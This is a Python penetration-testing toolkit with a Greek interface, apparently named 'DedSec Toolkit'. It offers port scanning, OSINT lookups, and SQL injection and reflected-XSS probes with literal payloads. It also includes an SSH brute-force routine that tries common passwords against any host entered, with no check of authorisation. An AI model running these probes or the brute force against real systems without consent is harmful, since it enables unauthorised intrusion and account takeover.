#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import subprocess
import importlib
import time
from datetime import datetime
import json
import re
import sqlite3
import threading
from collections import deque
import socket
from urllib.parse import urlparse, urljoin, quote, unquote, parse_qs, urlencode, urlunparse
import base64
import random
import string
import queue
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor
import html
import tempfile
import webbrowser
import shutil

# --- Εισαγωγές Εξαρτήσεων & Global Flags ---
CURSES_AVAILABLE = False
COLORS_AVAILABLE = False
SPEEDTEST_AVAILABLE = False
BS4_AVAILABLE = False
REQUESTS_AVAILABLE = False
PARAMIKO_AVAILABLE = False
WHOIS_AVAILABLE = False
DNS_AVAILABLE = False

speedtest = None
requests = None
BeautifulSoup = None
paramiko = None
whois = None
dns_resolver = None
csv = None 

# 1. Curses (TUI)
try:
    import curses
    CURSES_AVAILABLE = True
except ImportError:
    pass

# 2. Colorama
try:
    from colorama import Fore, Style, Back, init
    init()
    COLORS_AVAILABLE = True
except ImportError:
    class DummyColor:
        def __getattr__(self, name): return ''
    Fore = Back = Style = DummyColor()

# 3. Δυναμικές εισαγωγές
def _try_import(module_name, global_var_name):
    try:
        module = importlib.import_module(module_name)
        globals()[global_var_name] = module
        return True
    except ImportError:
        return False

SPEEDTEST_AVAILABLE = _try_import('speedtest', 'speedtest')
REQUESTS_AVAILABLE = _try_import('requests', 'requests')
if REQUESTS_AVAILABLE:
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
BS4_AVAILABLE = _try_import('bs4', 'bs4_module')
if BS4_AVAILABLE:
    BeautifulSoup = bs4_module.BeautifulSoup
PARAMIKO_AVAILABLE = _try_import('paramiko', 'paramiko')
WHOIS_AVAILABLE = _try_import('whois', 'whois')
DNS_AVAILABLE = _try_import('dns.resolver', 'dns_resolver')
_try_import('csv', 'csv') 


def auto_install_dependencies():
    """
    Αυτόματη εγκατάσταση όλων των απαιτούμενων εξαρτήσεων χωρίς root.
    """
    print(f"{Fore.CYAN}🛠️ DedSec Toolkit - Εγκαταστάτης Εξαρτήσεων{Style.RESET_ALL}")
    print("="*60)
    
    is_termux = os.path.exists('/data/data/com.termux')
    
    # Πακέτα συστήματος για Termux
    termux_packages = ['python', 'python-pip', 'openssl-tool', 'ncurses-utils']
    
    # Πακέτα Python
    pip_packages = [
        'requests', 'colorama', 'speedtest-cli', 'beautifulsoup4',
        'paramiko', 'python-whois', 'dnspython'
    ]
    
    if is_termux:
        print(f"\n{Fore.CYAN}[*] Έλεγχος πακέτων Termux...{Style.RESET_ALL}")
        try:
            subprocess.run(['pkg', 'install', '-y'] + termux_packages, capture_output=True)
            print(f"    {Fore.GREEN}✅ Τα πακέτα Termux εγκαταστάθηκαν.{Style.RESET_ALL}")
        except Exception as e:
            print(f"    {Fore.YELLOW}⚠️ Σφάλμα κατά την εγκατάσταση συστηματικών πακέτων: {e}{Style.RESET_ALL}")
    
    print(f"\n{Fore.CYAN}[*] Εγκατάσταση εξαρτήσεων Python...{Style.RESET_ALL}")
    for package in pip_packages:
        print(f"    [*] Έλεγχος {package}...")
        try:
            subprocess.run([sys.executable, '-m', 'pip', 'install', package], capture_output=True)
            print(f"    {Fore.GREEN}✅ {package} έτοιμο.{Style.RESET_ALL}")
        except Exception as e:
            print(f"    {Fore.RED}❌ Αποτυχία εγκατάστασης {package}: {e}{Style.RESET_ALL}")
    
    print(f"\n{Fore.GREEN}🎉 Η εγκατάσταση ολοκληρώθηκε! Γίνεται επανεκκίνηση...{Style.RESET_ALL}")
    time.sleep(2)
    return True

# --- Βοηθητικές Συναρτήσεις TUI ---
def _draw_curses_menu(stdscr, title, options):
    curses.curs_set(0)
    curses.init_pair(1, curses.COLOR_WHITE, curses.COLOR_BLACK) 
    curses.init_pair(2, curses.COLOR_CYAN, curses.COLOR_BLACK) 
    curses.init_pair(3, curses.COLOR_YELLOW, curses.COLOR_BLACK) 
    curses.init_pair(4, curses.COLOR_BLACK, curses.COLOR_CYAN) 
    
    current_row = 0
    while True:
        stdscr.clear()
        h, w = stdscr.getmaxyx()
        
        # Τίτλος
        stdscr.attron(curses.A_BOLD | curses.color_pair(2))
        stdscr.addstr(1, max(0, w//2 - len(title)//2), title)
        stdscr.attroff(curses.A_BOLD | curses.color_pair(2))
        stdscr.addstr(2, max(0, w//2 - 25), "=" * 50)

        for idx, option in enumerate(options):
            y = 4 + idx
            if y >= h - 1: break
            
            x = max(0, w//2 - len(option)//2)
            
            if option.startswith("---"):
                stdscr.attron(curses.color_pair(3))
                stdscr.addstr(y, x, option)
                stdscr.attroff(curses.color_pair(3))
            elif idx == current_row:
                stdscr.attron(curses.A_BOLD | curses.color_pair(4))
                stdscr.addstr(y, x, option.center(40))
                stdscr.attroff(curses.A_BOLD | curses.color_pair(4))
            else:
                stdscr.attron(curses.color_pair(1))
                stdscr.addstr(y, x, option.center(40))
                stdscr.attroff(curses.color_pair(1))
        
        stdscr.refresh()
        
        key = stdscr.getch()
        if key == curses.KEY_UP:
            current_row = (current_row - 1) % len(options)
            while options[current_row].startswith("---"):
                current_row = (current_row - 1) % len(options)
        elif key == curses.KEY_DOWN:
            current_row = (current_row + 1) % len(options)
            while options[current_row].startswith("---"):
                current_row = (current_row + 1) % len(options)
        elif key == curses.KEY_ENTER or key in [10, 13]:
            return current_row

# --- Κύρια Λογική ---

class AdvancedNetworkTools:
    def __init__(self):
        # Ρύθμιση Καταλόγου Αποθήκευσης
        is_termux = os.path.exists('/data/data/com.termux')
        if is_termux:
            base_dir = os.path.expanduser('~')
            self.save_dir = os.path.join(base_dir, "DedSec_Tools")
        else:
            self.save_dir = os.path.join(os.getcwd(), "DedSec_Tools")

        if not os.path.exists(self.save_dir):
            os.makedirs(self.save_dir)
        
        self.config_file = os.path.join(self.save_dir, "config.json")
        self.audit_db_name = os.path.join(self.save_dir, "audit_results.db")
        self.wordlist_dir = os.path.join(self.save_dir, "wordlists")
        if not os.path.exists(self.wordlist_dir): os.makedirs(self.wordlist_dir)

        self.init_audit_database()
        self.load_config()
        
        self.max_workers = self.config.get('max_scan_workers', 15)
        self.scan_timeout = self.config.get('scan_timeout', 1.5)
        
        # Προτίμηση Στυλ Μενού (Προεπιλογή: 'list' αν είναι διαθέσιμο, αλλιώς 'number')
        self.menu_style = 'list' if CURSES_AVAILABLE else 'number'

    def load_config(self):
        default_config = {
            "max_scan_workers": 20,
            "scan_timeout": 1.5,
            "top_ports": "21,22,23,25,53,80,110,143,443,445,993,995,1723,3306,3389,5900,8080",
            "common_usernames": "admin,root,user,administrator,test,guest",
        }
        self.config = default_config
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, 'r') as f: self.config.update(json.load(f))
            except: pass
        self.save_config()

    def save_config(self):
        try:
            with open(self.config_file, 'w') as f: json.dump(self.config, f, indent=4)
        except: pass
    
    def init_audit_database(self):
        with sqlite3.connect(self.audit_db_name) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS audit_results (
                    id INTEGER PRIMARY KEY, target TEXT, audit_type TEXT,
                    finding_title TEXT, description TEXT, severity TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            conn.commit()

    def record_audit_finding(self, target, audit_type, title, desc, severity):
        try:
            with sqlite3.connect(self.audit_db_name) as conn:
                cursor = conn.cursor()
                cursor.execute(
                    'INSERT INTO audit_results (target, audit_type, finding_title, description, severity) VALUES (?, ?, ?, ?, ?)',
                    (target, audit_type, title, desc, severity)
                )
                conn.commit()
        except Exception: pass

    # --- Εργαλείο: Internet & Δικτύωση ---
    
    def run_internet_speed_test(self):
        print(f"\n{Fore.CYAN}⚡️ ΔΟΚΙΜΗ ΤΑΧΥΤΗΤΑΣ ΙΝΤΕΡΝΕΤ{Style.RESET_ALL}")
        if not SPEEDTEST_AVAILABLE:
            print(f"{Fore.RED}❌ Το 'speedtest-cli' δεν είναι εγκατεστημένο.{Style.RESET_ALL}")
            input(f"\n{Fore.YELLOW}Πατήστε Enter...{Style.RESET_ALL}")
            return

        try:
            print(f"[*] Επιλογή καλύτερου διακομιστή...")
            st = speedtest.Speedtest()
            st.get_best_server()
            print(f"[*] Δοκιμή Λήψης...")
            dl = st.download() / 1_000_000
            print(f"[*] Δοκιμή Αποστολής...")
            ul = st.upload() / 1_000_000
            ping = st.results.ping
            
            print(f"\n{Fore.GREEN}✅ ΑΠΟΤΕΛΕΣΜΑΤΑ:{Style.RESET_ALL}")
            print(f"  Ping:     {ping:.2f} ms")
            print(f"  Λήψη: {Fore.GREEN}{dl:.2f} Mbps{Style.RESET_ALL}")
            print(f"  Αποστολή:   {Fore.GREEN}{ul:.2f} Mbps{Style.RESET_ALL}")
            print(f"  ISP:      {st.results.client['isp']}")
        except Exception as e:
            print(f"{Fore.RED}❌ Σφάλμα: {e}{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Πατήστε Enter...{Style.RESET_ALL}")

    def get_external_ip_info(self):
        print(f"\n{Fore.CYAN}🗺️ ΠΛΗΡΟΦΟΡΙΕΣ IP{Style.RESET_ALL}")
        if not REQUESTS_AVAILABLE: return
        try:
            data = requests.get("http://ip-api.com/json/", timeout=10).json()
            if data.get('status') == 'success':
                print(f"\n{Fore.GREEN}✅ Βρέθηκε Εξωτερικό IP:{Style.RESET_ALL}")
                print(f"  IP:       {data.get('query')}")
                print(f"  ISP:      {data.get('isp')}")
                print(f"  Τοποθεσία: {data.get('city')}, {data.get('country')}")
                print(f"  Οργανισμός:      {data.get('org')}")
            else:
                print(f"{Fore.RED}❌ Αποτυχία ανάκτησης πληροφοριών.{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}❌ Αποτυχία σύνδεσης: {e}{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Πατήστε Enter...{Style.RESET_ALL}")

    def subnet_calculator(self):
        print(f"\n{Fore.CYAN}🧮 ΥΠΟΛΟΓΙΣΤΗΣ SUBNET{Style.RESET_ALL}")
        ip_input = input(f"{Fore.WHITE}Εισάγετε IP/CIDR (π.χ. 192.168.1.0/24): {Style.RESET_ALL}").strip()
        
        try:
            if '/' not in ip_input: raise ValueError
            ip_str, cidr_str = ip_input.split('/')
            cidr = int(cidr_str)
            ip_parts = list(map(int, ip_str.split('.')))
            
            ip_int = (ip_parts[0] << 24) + (ip_parts[1] << 16) + (ip_parts[2] << 8) + ip_parts[3]
            mask_int = (0xFFFFFFFF << (32 - cidr)) & 0xFFFFFFFF
            network_int = ip_int & mask_int
            broadcast_int = network_int | ~mask_int & 0xFFFFFFFF
            
            def int_to_ip(val):
                return '.'.join([str((val >> (i << 3)) & 0xFF) for i in (3, 2, 1, 0)])
            
            print(f"\n{Fore.GREEN}✅ Υπολογισμός:{Style.RESET_ALL}")
            print(f"  Δίκτυο:   {int_to_ip(network_int)}")
            print(f"  Broadcast: {int_to_ip(broadcast_int)}")
            print(f"  Μάσκα Δικτύου:   {int_to_ip(mask_int)}")
            print(f"  Χρήσιμα:    {max(0, 2**(32-cidr) - 2)} hosts")
        except:
            print(f"{Fore.RED}❌ Μη έγκυρη μορφή.{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Πατήστε Enter...{Style.RESET_ALL}")

    def enhanced_port_scanner(self):
        """Python-based TCP Connect Scanner (Λειτουργεί χωρίς root)"""
        print(f"\n{Fore.CYAN}🔍 ΣΚΑΝΑΡΙΣΜΑ ΠΥΛΩΝ (TCP){Style.RESET_ALL}")
        target = input(f"{Fore.WHITE}Στόχος IP/Hostname: {Style.RESET_ALL}").strip()
        if not target: return

        try:
            target_ip = socket.gethostbyname(target)
            print(f"[*] Ανάλυση {target} -> {target_ip}")
        except:
            print(f"{Fore.RED}❌ Ο host δεν βρέθηκε.{Style.RESET_ALL}")
            return

        mode = input(f"{Fore.WHITE}Σκάναρισμα: (1) Βασικές Πύλες, (2) Εύρος 1-1024: {Style.RESET_ALL}").strip()
        if mode == '1':
            ports = [int(p) for p in self.config['top_ports'].split(',')]
        elif mode == '2':
            ports = range(1, 1025)
        else:
            ports = [21, 22, 80, 443]

        print(f"[*] Σκάναρισμα {len(ports)} πυλών με {self.max_workers} threads...")
        
        def scan_port(port):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(self.scan_timeout)
                    if s.connect_ex((target_ip, port)) == 0:
                        try:
                            serv = socket.getservbyport(port)
                        except: serv = "άγνωστο"
                        return port, serv
            except: pass
            return None

        open_ports = []
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = [executor.submit(scan_port, p) for p in ports]
            for future in concurrent.futures.as_completed(futures):
                res = future.result()
                if res:
                    print(f"  {Fore.GREEN}[+] Πύλη {res[0]} ΑΝΟΙΧΤΗ ({res[1]}){Style.RESET_ALL}")
                    open_ports.append(res)

        if open_ports:
            self.record_audit_finding(target, 'Σκάναρισμα Πυλών', f"{len(open_ports)} Ανοικτές Πύλες", str(open_ports), 'Πληροφορία')
        
        input(f"\n{Fore.YELLOW}Πατήστε Enter...{Style.RESET_ALL}")

    # --- Εργαλείο: OSINT & Συλλογή Πληροφοριών ---

    def get_whois_info(self):
        print(f"\n{Fore.CYAN}👤 WHOIS ΑΝΑΖΗΤΗΣΗ{Style.RESET_ALL}")
        if not WHOIS_AVAILABLE: 
            print("Λείπει module."); return
        domain = input("Domain: ").strip()
        if domain:
            try:
                w = whois.whois(domain)
                print(f"\n{Fore.GREEN}✅ Καταχωρητής: {w.registrar}{Style.RESET_ALL}")
                print(f"   Ημερομηνία Δημιουργίας: {w.creation_date}")
                print(f"   Emails: {w.emails}")
            except Exception as e:
                print(f"{Fore.RED}Σφάλμα: {e}{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Πατήστε Enter...{Style.RESET_ALL}")

    def get_dns_records(self):
        print(f"\n{Fore.CYAN}🌐 ΕΓΓΡΑΦΕΣ DNS{Style.RESET_ALL}")
        if not DNS_AVAILABLE: return
        domain = input("Domain: ").strip()
        if domain:
            for r in ['A', 'AAAA', 'MX', 'TXT', 'NS']:
                try:
                    answers = dns_resolver.resolve(domain, r)
                    print(f"{Fore.CYAN}[{r}]{Style.RESET_ALL}")
                    for d in answers: print(f"  {d}")
                except: pass
        input(f"\n{Fore.YELLOW}Πατήστε Enter...{Style.RESET_ALL}")

    def web_crawler(self):
        print(f"\n{Fore.CYAN}🕷️ WEB CRAWLER{Style.RESET_ALL}")
        if not REQUESTS_AVAILABLE or not BS4_AVAILABLE: return
        url = input("URL Έναρξης: ").strip()
        if not url.startswith('http'): url = 'https://' + url
        
        print(f"[*] Crawling (Μέγιστο 50 links)...")
        links = set()
        try:
            r = requests.get(url, timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
            soup = BeautifulSoup(r.content, 'html.parser')
            for a in soup.find_all('a', href=True):
                full = urljoin(url, a['href'])
                if full not in links:
                    links.add(full)
                    print(f"  - {full}")
                    if len(links) >= 50: break
        except Exception as e:
            print(f"{Fore.RED}Σφάλμα: {e}{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Πατήστε Enter...{Style.RESET_ALL}")

    def subdomain_enum(self):
        print(f"\n{Fore.CYAN}🔎 ΑΝΑΓΝΩΡΙΣΗ SUBDOMAINS{Style.RESET_ALL}")
        if not DNS_AVAILABLE: return
        domain = input("Domain: ").strip()
        
        subs = ['www', 'mail', 'ftp', 'webmail', 'smtp', 'pop', 'ns1', 'dev', 'test', 'api', 'admin', 'blog', 'shop']
        print(f"[*] Έλεγχος κοινών subdomains...")
        
        def check(sub):
            full = f"{sub}.{domain}"
            try:
                dns_resolver.resolve(full, 'A')
                return full
            except: return None

        with ThreadPoolExecutor(max_workers=20) as ex:
            futures = [ex.submit(check, s) for s in subs]
            for f in concurrent.futures.as_completed(futures):
                if f.result():
                    print(f"{Fore.GREEN}[+] Βρέθηκε: {f.result()}{Style.RESET_ALL}")
                    self.record_audit_finding(domain, 'Subdomain', 'Βρέθηκε', f.result(), 'Πληροφορία')
        
        input(f"\n{Fore.YELLOW}Πατήστε Enter...{Style.RESET_ALL}")

    def reverse_ip_lookup(self):
        print(f"\n{Fore.CYAN}🔄 ΑΝΤΙΣΤΡΟΦΗ ΑΝΑΖΗΤΗΣΗ IP{Style.RESET_ALL}")
        target = input("Στόχος IP/Domain: ").strip()
        try:
            r = requests.get(f"https://api.hackertarget.com/reverseiplookup/?q={target}", timeout=10)
            if 'error' not in r.text.lower() and 'no records' not in r.text.lower():
                print(f"\n{Fore.GREEN}✅ Domains σε αυτή τη IP:{Style.RESET_ALL}")
                for line in r.text.splitlines():
                    print(f"  - {line}")
            else:
                print(f"{Fore.YELLOW}Δεν βρέθηκαν εγγραφές.{Style.RESET_ALL}")
        except:
            print(f"{Fore.RED}Σφάλμα API.{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Πατήστε Enter...{Style.RESET_ALL}")

    # --- Εργαλείο: Web Ασφάλεια & Ευπάθειες ---

    def http_headers(self):
        print(f"\n{Fore.CYAN}📋 ΑΝΑΛΥΣΗ ΚΕΦΑΛΙΔΩΝ{Style.RESET_ALL}")
        url = input("URL: ").strip()
        if not url.startswith('http'): url = 'https://' + url
        try:
            r = requests.get(url, timeout=5)
            h = r.headers
            security = ['Strict-Transport-Security', 'X-Frame-Options', 'Content-Security-Policy']
            
            print(f"\n{Fore.GREEN}[+] Κεφαλίδες Ασφαλείας:{Style.RESET_ALL}")
            for s in security:
                if s in h: print(f"  {Fore.GREEN}✔ {s}: Βρέθηκε{Style.RESET_ALL}")
                else: print(f"  {Fore.RED}✖ {s}: Λείπει{Style.RESET_ALL}")
            
            if 'Server' in h:
                print(f"{Fore.YELLOW}[!] Διαρροή Server: {h['Server']}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}Σφάλμα: {e}{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Πατήστε Enter...{Style.RESET_ALL}")

    def sql_injector(self):
        print(f"\n{Fore.CYAN}💉 ΕΛΕΓΧΟΣ SQL INJECTION (Βασικός){Style.RESET_ALL}")
        url = input(f"URL με παράμετρο (π.χ. site.com?id=1): ").strip()
        if '?' not in url: 
            print("Χρειάζονται παράμετροι URL."); return
        
        payloads = ["'", "\"", "' OR '1'='1", " OR 1=1"]
        errors = ['sql', 'mysql', 'syntax', 'ora-']
        
        print(f"[*] Δοκιμή payloads...")
        vuln = False
        for p in payloads:
            target = url + p
            try:
                r = requests.get(target, timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
                if any(e in r.text.lower() for e in errors):
                    print(f"{Fore.RED}[!] Ευάλωτο σε Error-Based SQLi με: {p}{Style.RESET_ALL}")
                    vuln = True
                    break
            except: pass
        
        if not vuln: print(f"{Fore.GREEN}Δεν βρέθηκαν προφανείς ευπάθειες error-based.{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Πατήστε Enter...{Style.RESET_ALL}")

    def xss_scanner(self):
        print(f"\n{Fore.CYAN}🎯 ΕΛΕΓΧΟΣ XSS (Reflected){Style.RESET_ALL}")
        url = input(f"URL με παράμετρο (π.χ. site.com?q=test): ").strip()
        if '?' not in url: return
        
        base, params = url.split('?', 1)
        key = params.split('=')[0]
        payload = "<script>alert('XSS')</script>"
        target = f"{base}?{key}={payload}"
        
        print(f"[*] Αποστολή payload...")
        try:
            r = requests.get(target, timeout=5)
            if payload in r.text:
                print(f"{Fore.RED}[!] Βρέθηκε Reflected XSS!{Style.RESET_ALL}")
            else:
                print(f"{Fore.GREEN}Το payload δεν αντικατοπτρίζεται.{Style.RESET_ALL}")
        except: pass
        input(f"\n{Fore.YELLOW}Πατήστε Enter...{Style.RESET_ALL}")

    def cms_detect(self):
        print(f"\n{Fore.CYAN}🧬 ΑΝΙΧΝΕΥΣΗ CMS{Style.RESET_ALL}")
        url = input("URL: ").strip()
        if not url.startswith('http'): url = 'https://' + url
        try:
            r = requests.get(url, timeout=5)
            text = r.text.lower()
            if 'wp-content' in text: print(f"{Fore.GREEN}Ανιχνεύθηκε: WordPress{Style.RESET_ALL}")
            elif 'joomla' in text: print(f"{Fore.GREEN}Ανιχνεύθηκε: Joomla{Style.RESET_ALL}")
            elif 'drupal' in text: print(f"{Fore.GREEN}Ανιχνεύθηκε: Drupal{Style.RESET_ALL}")
            elif 'shopify' in text: print(f"{Fore.GREEN}Ανιχνεύθηκε: Shopify{Style.RESET_ALL}")
            else: print(f"{Fore.YELLOW}Άγνωστο CMS.{Style.RESET_ALL}")
        except: pass
        input(f"\n{Fore.YELLOW}Πατήστε Enter...{Style.RESET_ALL}")

    # --- Εργαλείο: Ελεγχος SSH ---

    def ssh_brute(self):
        print(f"\n{Fore.CYAN}🔐 BRUTE FORCE SSH (Paramiko){Style.RESET_ALL}")
        if not PARAMIKO_AVAILABLE: 
            print("Λείπει το Paramiko."); return
        
        host = input("Host IP: ").strip()
        user = input("Username: ").strip()
        passwords = ['admin', '123456', 'password', 'root', 'toor', '1234']
        
        print(f"[*] Δοκιμή κοινών κωδικών...")
        for pwd in passwords:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host, username=user, password=pwd, timeout=3)
                print(f"\n{Fore.GREEN}✅ ΣΕ ΣΥΝΔΕΣΗ: {user}:{pwd}{Style.RESET_ALL}")
                ssh.close()
                break
            except: 
                print(f"  [-] Απέτυχε: {pwd}")
        
        input(f"\n{Fore.YELLOW}Πατήστε Enter...{Style.RESET_ALL}")

    # --- Εργαλείο: Διαχείριση ---

    def view_logs(self):
        print(f"\n{Fore.CYAN}📊 ΑΡΧΕΙΟ ΑΠΟΤΕΛΕΣΜΑΤΩΝ{Style.RESET_ALL}")
        try:
            with sqlite3.connect(self.audit_db_name) as conn:
                cur = conn.cursor()
                cur.execute("SELECT * FROM audit_results ORDER BY timestamp DESC LIMIT 20")
                rows = cur.fetchall()
                for r in rows:
                    print(f"[{r[6]}] {r[2]} - {r[3]} ({r[5]})")
        except: pass
        input(f"\n{Fore.YELLOW}Πατήστε Enter...{Style.RESET_ALL}")

    def change_menu_style(self):
        print(f"\n{Fore.CYAN}🎨 ΕΠΙΛΟΓΗ ΣΤΥΛ ΜΕΝΟΥ{Style.RESET_ALL}")
        print(f"{Fore.WHITE}1. Διαδραστική Λίστα (Απαιτεί Curses/TUI){Style.RESET_ALL}")
        print(f"{Fore.WHITE}2. Επιλογή με Αριθμό (Κλασικό CLI){Style.RESET_ALL}")
        
        choice = input(f"\n{Fore.WHITE}Επιλέξτε επιλογή (1-2): {Style.RESET_ALL}").strip()
        
        if choice == '1':
            if CURSES_AVAILABLE:
                self.menu_style = 'list'
                print(f"{Fore.GREEN}✅ Το στυλ μενού ορίστηκε σε Διαδραστική Λίστα.{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}❌ Το Curses δεν είναι διαθέσιμο. Δεν μπορεί να γίνει αλλαγή σε στυλ Λίστας.{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}Εγκαταστήστε ncurses-utils ή εκτελέστε σε συμβατό τερματικό.{Style.RESET_ALL}")
        elif choice == '2':
            self.menu_style = 'number'
            print(f"{Fore.GREEN}✅ Το στυλ μενού ορίστηκε σε Επιλογή με Αριθμό.{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}❌ Μη έγκυρη επιλογή.{Style.RESET_ALL}")
            
        time.sleep(1.5)

    # --- Κύριο Μενού ---

    def run(self):
        while True:
            options = [
                "--- ΔΙΚΤΥΟ & ΣΥΝΔΕΣΙΜΟΤΗΤΑ ---", # 0
                "Σκάναρισμα Πυλών (TCP)",             # 1
                "Υπολογιστής Subnet",              # 2
                "Δοκιμή Ταχύτητας Internet",            # 3
                "Πληροφορίες Εξωτερικού IP",               # 4
                "--- OSINT & RECON ---",          # 5
                "Αναζήτηση WHOIS",                   # 6
                "Εγγραφές DNS",                    # 7
                "Αναγνώριση Subdomains",          # 8
                "Αντίστροφη Αναζήτηση IP",              # 9
                "Web Crawler",                    # 10
                "--- WEB ΑΣΦΑΛΕΙΑ ---",           # 11
                "Αναλυτής Κεφαλίδων HTTP",           # 12
                "Ανιχνευτής CMS",                   # 13
                "Ελεγχος SQL Injection",           # 14
                "Σκάναρισμα Reflected XSS",          # 15
                "Brute Force SSH",                # 16
                "--- ΣΥΣΤΗΜΑ ---",                 # 17
                "Προβολή Αρχείου Αποτελεσμάτων",                # 18
                "Αλλαγή Στυλ Μενού",              # 19
                "Έξοδος"                            # 20
            ]

            # Λογική για απόφαση Στυλ Μενού
            sel = -1
            if CURSES_AVAILABLE and self.menu_style == 'list':
                sel = curses.wrapper(_draw_curses_menu, "DedSec Network Tool (Lite)", options)
            else:
                # Στυλ Επιλογής με Αριθμό
                print(f"\n{Fore.CYAN}{'='*40}{Style.RESET_ALL}")
                print(f"{Fore.CYAN}   DEDSEC TOOLKIT - ΕΠΙΛΕΞΤΕ ΜΕ ΑΡΙΘΜΟ{Style.RESET_ALL}")
                print(f"{Fore.CYAN}{'='*40}{Style.RESET_ALL}")
                
                valid_indices = []
                for i, o in enumerate(options):
                    if o.startswith("---"):
                        print(f"{Fore.YELLOW}{o}{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.WHITE}{i:2}. {o}{Style.RESET_ALL}")
                        valid_indices.append(i)
                
                try:
                    choice_input = input(f"\n{Fore.CYAN}Επιλέξτε επιλογή > {Style.RESET_ALL}").strip()
                    if choice_input:
                        sel = int(choice_input)
                except ValueError:
                    sel = -1

            # Αντιστοίχιση Επιλογής σε Συναρτήσεις
            opt_map = {
                1: self.enhanced_port_scanner,
                2: self.subnet_calculator,
                3: self.run_internet_speed_test,
                4: self.get_external_ip_info,
                6: self.get_whois_info,
                7: self.get_dns_records,
                8: self.subdomain_enum,
                9: self.reverse_ip_lookup,
                10: self.web_crawler,
                12: self.http_headers,
                13: self.cms_detect,
                14: self.sql_injector,
                15: self.xss_scanner,
                16: self.ssh_brute,
                18: self.view_logs,
                19: self.change_menu_style
            }

            if sel == 20:
                print(f"{Fore.GREEN}Αντίο.{Style.RESET_ALL}")
                break
            
            if sel in opt_map:
                try:
                    opt_map[sel]()
                except KeyboardInterrupt:
                    print(f"\n{Fore.YELLOW}Η λειτουργία ακυρώθηκε.{Style.RESET_ALL}")
            elif sel != -1 and not options[sel].startswith("---"):
                print(f"{Fore.RED}Μη έγκυρη επιλογή.{Style.RESET_ALL}")
                time.sleep(1)

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--install":
        auto_install_dependencies()
        sys.exit()

    try:
        app = AdvancedNetworkTools()
        app.run()
    except KeyboardInterrupt:
        print("\nΈξοδος.")
    except Exception as e:
        print(f"Σφάλμα: {e}")
        if not REQUESTS_AVAILABLE:
            print(f"Εκτελέστε 'python {sys.argv[0]} --install' για να διορθώσετε τις εξαρτήσεις.")